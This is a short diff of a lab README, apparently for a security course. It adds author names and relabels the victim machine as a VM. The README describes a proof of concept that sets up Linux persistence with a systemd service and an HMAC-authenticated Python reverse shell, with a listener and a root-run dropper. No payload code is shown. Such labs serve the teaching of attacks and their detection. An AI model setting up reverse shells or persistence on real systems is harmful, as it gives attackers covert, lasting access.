@@ -1,5 +1,7 @@
 # Lab: Reverse Shell Persistence & Detection
 
+By: Alex Lee, Yu Lim, Ethan Zhang
+
 This proof-of-concept demonstrates a Linux persistence mechanism using a **systemd service** and a **Python reverse shell** secured with HMAC authentication.
 
 ---
@@ -19,7 +21,7 @@ Start the listener to wait for the incoming connection:
 python3 client.py
 ```
 
-### 2. Victim (Week 4 Host)
+### 2. Victim (Week 4 VM)
 Run the dropper with root privileges to establish persistence:
 
 ```bash
